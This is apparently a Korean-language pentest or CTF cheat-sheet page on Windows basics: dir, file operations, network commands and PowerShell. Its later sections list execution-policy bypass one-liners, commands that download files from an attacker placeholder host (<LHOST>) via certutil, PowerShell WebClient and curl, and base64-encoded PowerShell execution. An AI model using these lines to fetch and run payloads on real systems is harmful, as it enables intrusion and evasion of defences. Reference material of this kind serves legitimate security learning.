---
sidebar_position: 4
---

# Windows

Windows 기본 명령어 및 유틸리티입니다.

## dir 명령어

```cmd
# 기본 목록
dir

# 숨김 파일/폴더 포함
dir /a

# 숨김 디렉토리만
dir /a:d

# 숨김 파일만
dir /a:h

# 파일 검색 (재귀)
dir flag* /s /p
dir /s /b *.log

# 상세 정보
dir /q  # 소유자 표시
```

## 파일 조작

```cmd
# 복사
copy source.txt destination.txt
xcopy /E /I source_dir dest_dir

# 이동
move file.txt C:\destination\

# 삭제
del file.txt
rmdir /s /q directory

# 내용 보기
type file.txt
more file.txt
```

## 네트워크

```cmd
# IP 설정
ipconfig
ipconfig /all

# 네트워크 연결
netstat -ano
netstat -an | findstr LISTENING

# 라우팅 테이블
route print

# ARP 테이블
arp -a

# Ping
ping <RHOST>
ping -n 1 <RHOST>

# DNS 조회
nslookup <DOMAIN>
```

## PowerShell 기본

```powershell
# 버전 확인
$PSVersionTable

# 명령어 도움말
Get-Help <COMMAND>
Get-Command

# 파일 목록
Get-ChildItem
Get-ChildItem -Recurse
Get-ChildItem -Hidden

# 파일 내용
Get-Content file.txt
cat file.txt

# 파일 검색
Get-ChildItem -Path C:\ -Include *.txt -Recurse -ErrorAction SilentlyContinue
```

## Execution Policy

```powershell
# 현재 정책 확인
Get-ExecutionPolicy

# 정책 변경 (관리자)
Set-ExecutionPolicy Unrestricted
Set-ExecutionPolicy RemoteSigned

# 우회
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass
powershell -nop -ep bypass

# 스크립트 실행
.\script.ps1
powershell -File script.ps1
```

## 파일 다운로드

```cmd
# certutil
certutil -urlcache -f http://<LHOST>/<FILE> <FILE>

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<LHOST>/<FILE>', '<FILE>')"
powershell -c "IWR -Uri 'http://<LHOST>/<FILE>' -OutFile '<FILE>'"
powershell -c "Invoke-WebRequest -Uri 'http://<LHOST>/<FILE>' -OutFile '<FILE>'"

# wget (Windows 10+)
wget http://<LHOST>/<FILE> -O <FILE>

# curl (Windows 10+)
curl http://<LHOST>/<FILE> -o <FILE>
```

## 인코딩

```powershell
# Base64 인코딩
$bytes = [System.Text.Encoding]::Unicode.GetBytes('<COMMAND>')
$encoded = [Convert]::ToBase64String($bytes)
$encoded

# Base64 실행
powershell -enc <BASE64>
```

## 참고

- 기본 파일/네트워크 조작
- PowerShell 사용법
- 권한 상승은 Privilege Escalation 섹션 참조
